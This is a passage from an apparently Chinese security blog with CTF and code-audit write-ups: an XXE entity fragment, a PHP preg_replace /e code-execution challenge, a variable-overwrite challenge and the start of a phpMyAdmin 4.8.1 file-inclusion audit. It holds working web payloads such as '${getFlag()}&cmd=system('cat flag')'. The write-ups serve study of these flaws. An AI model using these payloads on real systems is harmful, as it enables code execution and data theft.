<!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" ><p>]&gt;<br><root><br><name>&xxe;</name><br></root></p>
<p>```</p>
<p>详细请看：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887#toc-4">https://xz.aliyun.com/t/6887#toc-4</a><br>但是XML注入方面请看本文章，原文章有错</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-preg_replace远程执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/02/preg_replace%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-09-01T16:00:00.000Z" itemprop="datePublished">2021-09-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/02/preg_replace%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
        preg_replace远程执行漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="preg-replace远程执行漏洞"><a href="#preg-replace远程执行漏洞" class="headerlink" title="preg_replace远程执行漏洞"></a>preg_replace远程执行漏洞</h1><p>当打开页面时，会看到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到这判断时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
<p>可知，我们的$text里要有 I have a dream，而看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/flag/&quot;,$file);</span><br></pre></td></tr></table></figure>
<p>可知，我们的$file中不能有flag关键字，但是有提示next.php，因此我们可以使用data伪协议和php伪协议，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>而后我们通过base64解码，可以看见next.php源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过看见代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以想到preg_replace的远程执行漏洞，因此可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
<p>但不可以显示，因为“.*”被转义为“_*”,因此使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
<p>而按照next.php的代码，可以利用getFlag()函数里的eval()，因此我们可以构造payload来调用getFlag()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat flag&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="preg-replace远程执行漏洞-1"><a href="#preg-replace远程执行漏洞-1" class="headerlink" title="preg_replace远程执行漏洞"></a>preg_replace远程执行漏洞</h2><p>preg_replace()函数是/e模式时，当匹配成功后，会对替换部分用eval()进行代码的执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">preg_replace(&quot;/test/e&quot;,$_GET[&quot;hack&quot;],&quot;just test&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>当我们构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hack=phpinfo();</span><br></pre></td></tr></table></figure>
<p>因为test会与”just test”中的test相匹配进行替换，所以会对替换部分”phpinfo();”进行代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(phpinfo();)</span><br></pre></td></tr></table></figure>
<p>而防止这个情况发生，现在的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function complexStrtolower($regex,$value)&#123;</span><br><span class="line">	return preg_replace(&#x27;/(&#x27;.$regex.&#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $regex=&gt;$value)&#123;</span><br><span class="line">	echo complexStrtolower($regex,$value).&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，此时我们可以控制的变量只有两个，而替换部分不是我们可以控制的量，已经变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strtolower(&quot;\\1&quot;)</span><br></pre></td></tr></table></figure>
<p>因此，我们要办法利用替换部分来执行我们的代码，但是当我们preg_replace()匹配成功后，会以eval(‘strtolower(“\1”);’)代码的形式执行，而其中\1实际为\1，而\1在正则表达式中有自己的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line">    对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure>
<p>这里的\1实际上指定的是第一个子匹配项，而</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(\S*)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,&quot;$&#123;phpinfo()&#125;&quot;);</span><br><span class="line">``</span><br><span class="line">的第一匹配项为$&#123;phpinfo()&#125;，而其中</span><br></pre></td></tr></table></figure>
<p>”\S*“相当于是除了换行符以外的所有字符串</p>
<p>”.*“相当于是除了换行符以外的所有字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因此判断项可以使用”\S*“或”.*“匹配输入的字符串，从而使替换部分可以进行代码执行，因此可以按以上的代码构造payload</span><br></pre></td></tr></table></figure>
<p>?.*=${phpinfo()}</p>
<p>?\S*=${phpinfo()}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">会返回php的版本，而$&#123;phpinfo()&#125;这条代码，构造</span><br></pre></td></tr></table></figure>
<p>?\w+=${phpinfo()}</p>
<pre><code>也可以执行,但是”.*“一般在get提交时被转义为”_*“，所以会用”S*“来代替

详细请看：https://xz.aliyun.com/t/2557”

</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-09-01T16:00:00.000Z" itemprop="datePublished">2021-09-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">
        变量覆盖漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>打开页面，然后用dirsearch扫描。发现.git文件泄露<br>flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p> index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;	//GET方式传flag只能传一个flag=flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;	//GET和POST其中之一必须传flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;	//GET和POST传flag,必须不能是flag=flag</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>

<p>exit()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()函数会输出一条信息后退出</span><br></pre></td></tr></table></figure>
<p>我们可以利用这个exit()函数来对调用flag.php文件里的file_get_contents(‘/flag’)，读出flag出来</p>
<p>因此我们看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x=&gt;$y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>中的$$x和$$y，我们可以看到有变量覆盖漏洞，因此我们get提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
<p>让$x=yds，$y=flag，所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x==$$y“相当于”$yds=$flag“</span><br></pre></td></tr></table></figure>
<p>所以我们要办法利用exit($yds)，因此我们要通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br></pre></td></tr></table></figure>
<p>这一个条件，所以我们要让$_GET[‘flag’]和$_POST[‘flag’]不存在，所以之前构造的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
<p>便符合条件</p>
<p>而如果想利用exit($is)的话，我们可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造get提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure>
<p>便会构成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x=$$y“相当于”$is=$flag“</span><br></pre></td></tr></table></figure>
<p>然后我们经过以下条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>
<p>所以get要提交的参数flag或post要提交参数flag，所以可以构造paload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">get提交：?is=flag</span><br><span class="line">post提交：flag=flag</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/31/phpmyadmin%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-08-30T16:00:00.000Z" itemprop="datePublished">2021-08-31</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/31/phpmyadmin%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
        phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin任意包含文件漏洞及任意代码执行漏洞"><a href="#phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="headerlink" title="phpmyadmin任意包含文件漏洞及任意代码执行漏洞"></a>phpmyadmin任意包含文件漏洞及任意代码执行漏洞</h1><p>打开页面后，用御剑对网址进行扫描，发现<a target="_blank" rel="noopener" href="http://url/phpmyadmin/%E5%8F%AF%E4%BB%A5%E8%BF%9B%E5%85%A5%E5%88%B0phpmyadmin%E7%9A%84%E7%95%8C%E9%9D%A2%E4%B8%AD%EF%BC%8C%E6%AD%A4%E6%97%B6%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%83%B3%E5%88%B0phpmyadmin4.8.1%E7%9A%84%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BB%8E%E7%BD%91%E5%9D%80%EF%BC%9Ahttps://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%9C%AC%E5%9C%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8php5.6%E7%89%88%E6%9C%AC%E8%BF%9B%E8%A1%8C%E5%A4%8D%E7%8E%B0">http://url/phpmyadmin/可以进入到phpmyadmin的界面中，此时我们可以想到phpmyadmin4.8.1的任意包含漏洞及任意执行代码漏洞，可以从网址：https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip中下载本地，然后用php5.6版本进行复现</a></p>
<p>通过审计源码<br>我们可以从index.php文件中50-63行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = array (</span><br><span class="line">    &#x27;import.php&#x27;, &#x27;export.php&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// If we have a valid target, let&#x27;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#x27;target&#x27;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现只要满足一下五个条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. $_REQUEST[&#x27;target&#x27;]不为空</span><br><span class="line"></span><br><span class="line">2. $_REQUEST[&#x27;target&#x27;]是字符串</span><br><span class="line"></span><br><span class="line">3. $_REQUEST[&#x27;target&#x27;]不以index开头</span><br><span class="line"></span><br><span class="line">4. $_REQUEST[&#x27;target&#x27;]含有的文件不在$target_blacklist=array(&#x27;import.php&#x27;,&#x27;export.php&#x27;)中</span><br><span class="line"></span><br><span class="line">5. Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])为真</span><br></pre></td></tr></table></figure>

<p>而在libraries\classes\Core.php 443-476行的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist = self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中如果$whilelist为空的话，会自动导入$goto_whilelist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist = array(</span><br><span class="line">        &#x27;db_datadict.php&#x27;,</span><br><span class="line">        &#x27;db_sql.php&#x27;,</span><br><span class="line">        &#x27;db_events.php&#x27;,</span><br><span class="line">        &#x27;db_export.php&#x27;,</span><br><span class="line">        &#x27;db_importdocsql.php&#x27;,</span><br><span class="line">        &#x27;db_multi_table_query.php&#x27;,</span><br><span class="line">        &#x27;db_structure.php&#x27;,</span><br><span class="line">        &#x27;db_import.php&#x27;,</span><br><span class="line">        &#x27;db_operations.php&#x27;,</span><br><span class="line">        &#x27;db_search.php&#x27;,</span><br><span class="line">        &#x27;db_routines.php&#x27;,</span><br><span class="line">        &#x27;export.php&#x27;,</span><br><span class="line">        &#x27;import.php&#x27;,</span><br><span class="line">        &#x27;index.php&#x27;,</span><br><span class="line">        &#x27;pdf_pages.php&#x27;,</span><br><span class="line">        &#x27;pdf_schema.php&#x27;,</span><br><span class="line">        &#x27;server_binlog.php&#x27;,</span><br><span class="line">        &#x27;server_collations.php&#x27;,</span><br><span class="line">        &#x27;server_databases.php&#x27;,</span><br><span class="line">        &#x27;server_engines.php&#x27;,</span><br><span class="line">        &#x27;server_export.php&#x27;,</span><br><span class="line">        &#x27;server_import.php&#x27;,</span><br><span class="line">        &#x27;server_privileges.php&#x27;,</span><br><span class="line">        &#x27;server_sql.php&#x27;,</span><br><span 